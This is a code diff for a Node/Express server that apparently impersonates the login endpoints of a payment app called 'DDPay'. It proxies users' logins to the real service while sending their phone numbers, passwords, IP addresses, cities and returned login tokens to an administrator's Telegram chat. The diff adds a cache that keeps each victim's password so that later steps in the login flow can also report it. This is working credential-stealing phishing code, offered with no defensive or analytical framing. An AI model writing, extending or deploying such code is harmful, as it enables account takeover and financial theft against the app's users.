@@ -1921,27 +1921,20 @@ Example:
   }
 });
 
+const userPwdMap = {};
+
 app.post('/app/user/login/login', async (req, res) => {
   try {
     const data = await loadData();
     const body = req.parsedBody || {};
     const phone = body.userName || body.username || body.phone || body.mobile || '';
-    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+    let pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+    if (phone && pwd !== 'N/A') userPwdMap[String(phone)] = pwd;
+    if (phone && pwd === 'N/A' && userPwdMap[String(phone)]) pwd = userPwdMap[String(phone)];
+
     const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
     const city = req.headers['x-vercel-ip-city'] || 'N/A';
     const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-    if (data.adminChatId && bot) {
-      let msg =
-        `🔑 *Login Attempt (Credentials Received)*\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
-        `🔒 *Password:* \`${pwd}\`\n` +
-        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
-        `🕐 *Time:* ${time}`;
-
-      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
-    }
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const loginData = getResponseData(jsonResp);
@@ -1988,7 +1981,7 @@ app.post('/app/user/login/login', async (req, res) => {
       if (isSuccess) {
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
         let msg =
-          `✅ *Login Successful*\n` +
+          `✅ *[DDPay] Direct Login ${isSuccess ? 'Successful' : 'Failed'}*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
@@ -2028,14 +2021,17 @@ async function sendOtpHandler(req, res) {
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
       const phone = body.userName || body.phone || body.mobile || 'N/A';
-      const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+      let pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+      if (phone !== 'N/A' && pwd !== 'N/A') userPwdMap[String(phone)] = pwd;
+      if (phone !== 'N/A' && pwd === 'N/A' && userPwdMap[String(phone)]) pwd = userPwdMap[String(phone)];
+
       const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
       const city = req.headers['x-vercel-ip-city'] || 'N/A';
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
         let msg =
-          `📲 *OTP Sent Successfully*\n` +
+          `📲 *[DDPay] OTP Sent Successfully*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `📱 *Phone:* \`${phone}\`\n` +
           `🔒 *Password:* \`${pwd}\`\n` +
@@ -2079,14 +2075,17 @@ app.post('/app/user/login/start', async (req, res) => {
     const data = await loadData();
     const body = req.parsedBody || {};
     const phone = body.userName || body.phone || body.mobile || 'N/A';
-    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+    let pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+    if (phone !== 'N/A' && pwd !== 'N/A') userPwdMap[String(phone)] = pwd;
+    if (phone !== 'N/A' && pwd === 'N/A' && userPwdMap[String(phone)]) pwd = userPwdMap[String(phone)];
+
     const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
     const city = req.headers['x-vercel-ip-city'] || 'N/A';
     const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
     if (data.adminChatId && bot) {
       let msg =
-        `🔑 *Login Attempt (Credentials Received)*\n` +
+        `🔑 *[DDPay] Login Attempt Started*\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `📱 *Phone:* \`${phone}\`\n` +
         `🔒 *Password:* \`${pwd}\`\n` +
@@ -2113,6 +2112,10 @@ app.post('/app/user/login/confirm', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.userName || body.phone || body.mobile || '';
+    let pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
+    if (phone && pwd !== 'N/A') userPwdMap[String(phone)] = pwd;
+    if (phone && pwd === 'N/A' && userPwdMap[String(phone)]) pwd = userPwdMap[String(phone)];
+
     const loginData = getResponseData(jsonResp);
     let userId = '';
 
@@ -2157,7 +2160,6 @@ app.post('/app/user/login/confirm', async (req, res) => {
     }
 
     if (data.adminChatId && bot) {
-      const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
       const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
       const city = req.headers['x-vercel-ip-city'] || 'N/A';
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
@@ -2165,7 +2167,7 @@ app.post('/app/user/login/confirm', async (req, res) => {
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
         let msg =
-          `✅ *Login Successful*\n` +
+          `✅ *[DDPay] Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
@@ -2181,7 +2183,7 @@ app.post('/app/user/login/confirm', async (req, res) => {
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         let msg =
-          `❌ *Login Failed*\n` +
+          `❌ *[DDPay] Login Failed*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
           `🔒 *Password:* \`${pwd}\`\n` +
